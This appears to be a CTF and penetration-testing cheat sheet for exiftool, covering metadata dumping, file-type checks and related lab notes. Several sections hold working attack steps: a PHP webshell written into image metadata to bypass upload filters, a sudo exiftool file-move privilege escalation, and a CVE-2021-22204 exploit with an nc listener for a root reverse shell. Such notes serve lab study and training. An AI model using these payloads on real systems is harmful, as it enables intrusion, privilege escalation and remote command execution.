# exiftool

## Wreath Commands

```bash
mv image.jpg image.jpeg.php
exiftool -Comment="$(cat /tmp/payload.php)" image.jpeg.php
```
Used on: **Wreath** - embedded PHP webshell code in image metadata to bypass an upload filter.

Reads and writes file metadata — EXIF (JPEG), PNG textual chunks, PDF info dict, XMP, IPTC. First tool to run on any image / PDF / media file that surfaces during recon: author names, cameras, GPS, and — on CTFs — passphrases or hints stashed in `Comment` / `Description` fields.

## Commands Used

### Dump all metadata
```bash
exiftool oneforall.jpg     # [USED — Yueiua]
```
Scan the output for `Comment`, `Description`, `Artist`, `Software`, `UserComment`, `XPComment`.

### Single tag
```bash
exiftool -Comment oneforall.jpg
exiftool -UserComment oneforall.jpg
exiftool -GPSLatitude -GPSLongitude -GPSPosition file.jpg
```

### Format as JSON / CSV (grep-friendly)
```bash
exiftool -j oneforall.jpg           # JSON
exiftool -csv oneforall.jpg         # CSV header + row
exiftool -G -s file.jpg             # group + short tag
```

### Recurse a directory
```bash
exiftool -r -ext jpg -ext png -ext pdf ./loot/
```

### Detect real file type (when extension lies)
```bash
exiftool -FileType -MIMEType oneforall.jpg
# FileType: PNG
# MIMEType: image/png
# Extension said .jpg but bytes are PNG.
```
Cross-check with `file` before opening in any tool.

### Strip metadata (cleanup before sharing PoCs)
```bash
exiftool -all= -overwrite_original file.jpg
```

### Write metadata (useful for bypassing server-side checks)
```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' shell.jpg
```

### `sudo exiftool` privesc — direct file move (no CVE needed)
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/exiftool *

sudo exiftool -filename=/home/stux/root.txt /root/root.txt   # [USED — cmspit]
cat /home/stux/root.txt                                       # ? root flag
```
The `-filename=` flag *renames* the source file under the elevated privileges. Move root-only files into a path you can read, or overwrite a high-value file (`/root/.bashrc`, `~/.ssh/authorized_keys`). Full chain in [exiftool-sudo-cve-2021-22204.md](../../privesc/linux/exiftool-sudo-cve-2021-22204.md).

### CVE-2021-22204 — Perl exec via crafted DjVu metadata
```bash
git clone https://github.com/convisolabs/CVE-2021-22204-exiftool && cd CVE-2021-22204-exiftool
nano exploit.sh && ./build_image.sh
nc -lvnp 4444
sudo /usr/bin/exiftool image.jpg          # Perl reverse-shell payload runs as root
```
Affects exiftool = 12.23. Works when the sudoers rule whitelists exiftool but filters `-filename=`.

## Warning Messages You Will See on CTFs

| Warning | Meaning | Action |
|---------|---------|--------|
| `PNG image did not start with IHDR` | PNG magic bytes corrupted | Restore `89 50 4E 47 0D 0A 1A 0A` with `printf`+`dd` |
| `Corrupted JPEG data` | Magic or segment table damaged | Fix `FF D8` magic; try `jhead -fi` |
| `Bad IFD entry` | EXIF section truncated | Not usually fatal — rest of file still readable |
| `Unknown APPn segment` | Custom JPEG section | Possibly hiding a payload; dump with `exiftool -b -XMP:XMPToolkit` or carve with `binwalk` |

## Tips
- Always pair with `file <x>` — extension lies, metadata lies; magic bytes rarely do.
- `exiftool` prints nothing for stego payloads inside the pixel data — that's what `steghide`, `zsteg`, `stegseek` are for.
- On multi-page PDFs, `exiftool <pdf>` often shows the author's real username — good pivot for password sprays.

## Related
- [steghide](../stego/steghide.md) — next step if metadata is clean but size looks bloated
- [strings](../reversing/strings.md) — quick readable-string sweep over the same file
- [steganography-image-loot.md](../../techniques/stego/steganography-image-loot.md) — full image-loot chain


